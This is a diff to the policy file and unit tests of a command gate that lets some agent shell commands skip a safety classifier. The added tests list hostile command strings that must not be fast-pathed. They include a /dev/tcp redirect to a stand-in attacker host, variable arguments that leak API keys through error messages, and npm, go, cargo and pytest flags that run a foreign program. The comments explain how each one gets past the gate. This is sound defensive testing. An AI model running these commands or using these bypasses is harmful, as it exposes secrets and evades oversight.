@@ -15,7 +15,7 @@ version: 1
 mode: guard
 gate:
   tools: [Bash, Edit]
-  fast_path: ["git status", "ls ", "npm test"]
+  fast_path: ["git status ", "ls ", "npm test"]
   questions:
     destructive:
       instructions: "It destroys something."
@@ -174,9 +174,10 @@ describe("shortCircuit", () => {
     const hits: ReadonlyArray<readonly [string, string]> = [
       ["an exact match", "git status"],
       ["an exact match with surrounding whitespace", "  git status  "],
-      ["a prefix written with a trailing space", "ls -la src/"],
-      ["a word-boundary match on a prefix written without one", "git status --short"],
-      ["a longer command with the same prefix", "npm test -- --watch"],
+      ["arguments after an entry written with a trailing space", "ls -la src/"],
+      ["another such entry", "git status --short"],
+      ["the bare form of an entry that takes arguments", "ls"],
+      ["an entry written as a whole command, run as written", "npm test"],
     ];
 
     it.each(hits)("allows %s without calling the classifier", (_label, command) => {
@@ -202,7 +203,14 @@ describe("shortCircuit", () => {
       ["an append redirect", "git status >> ~/.zshrc"],
       ["an input redirect", "npm test < /dev/tcp/evil.example.com/80"],
       ["a redirect with no space before it", "ls>.env"],
+      // The shell expands it before the verb sees it, and the verb's error message prints it.
+      ["a variable as an argument", "ls $OPENAI_API_KEY"],
+      ["a braced variable as an argument", "ls ${STRIPE_SECRET_KEY}"],
       ["an unrelated command", "rm -rf build"],
+      // An entry with no trailing space is a whole command. ADR-010: the argument is what
+      // makes `npm test` stop being the project's own script.
+      ["arguments after an entry written as a whole command", "npm test -- --watch"],
+      ["a flag that swaps the shell the script runs in", "npm test --script-shell /tmp/x.sh"],
       ["an empty command", ""],
       ["whitespace only", "   "],
     ];
@@ -249,7 +257,7 @@ describe("the shipped default policy, end to end", () => {
   });
 
   it("fast-paths the commands a session actually repeats", () => {
-    for (const command of ["git status", "git status --short", "npm test", "ls -la", "pwd", "which node"]) {
+    for (const command of ["git status", "git status --short", "npm test", "npm run build", "ls", "ls -la", "pwd", "which node", "cargo test", "go test ./..."]) {
       expect(shortCircuit(shipped, { tool: "Bash", command })?.reason).toMatchObject({ kind: "fast-path" });
     }
   });
@@ -287,6 +295,21 @@ describe("the shipped default policy, end to end", () => {
     ["moving a branch back twenty commits", "git branch -f main HEAD~20"],
     ["renaming the current branch", "git branch -m main old"],
     ["removing a remote behind a read-only flag", "git remote -v remove origin"],
+    // `echo $OPENAI_API_KEY` by another verb. Tried with a fake variable: `ls $VAR` prints
+    // "ls: <value>: No such file or directory" in bash and zsh, and zsh's `which $VAR` prints
+    // "<value> not found". The matcher refused `$(` and let a bare `$` through.
+    ["listing a path named by a secret", "ls $OPENAI_API_KEY"],
+    ["resolving a command named by a secret", "which $AWS_SECRET_ACCESS_KEY"],
+    ["a status scoped to a path named by a secret", "git status ${GITHUB_TOKEN}"],
+    // A listed verb that runs the project's own code, given the argument that makes it run
+    // something else. The first four were each run for real in a scratch project and did
+    // what the label says; pytest was not installed to try, and `-p` is its documented way
+    // to load a plugin module. See docs/adr/010.
+    ["npm running a foreign program as its script shell", "npm test --script-shell /tmp/x.sh"],
+    ["npm running another package's script", "npm run build --prefix ../other"],
+    ["go running a foreign program in place of the test binary", "go test -exec /tmp/x.sh"],
+    ["cargo running a foreign program as the compiler wrapper", 'cargo check --config build.rustc-wrapper="/tmp/x.sh"'],
+    ["pytest loading a plugin module by name", "pytest -p evil_plugin"],
   ];
 
   it.each(mustNeverBeAllowedUnjudged)("does not fast-path %s", (_label, command) => {
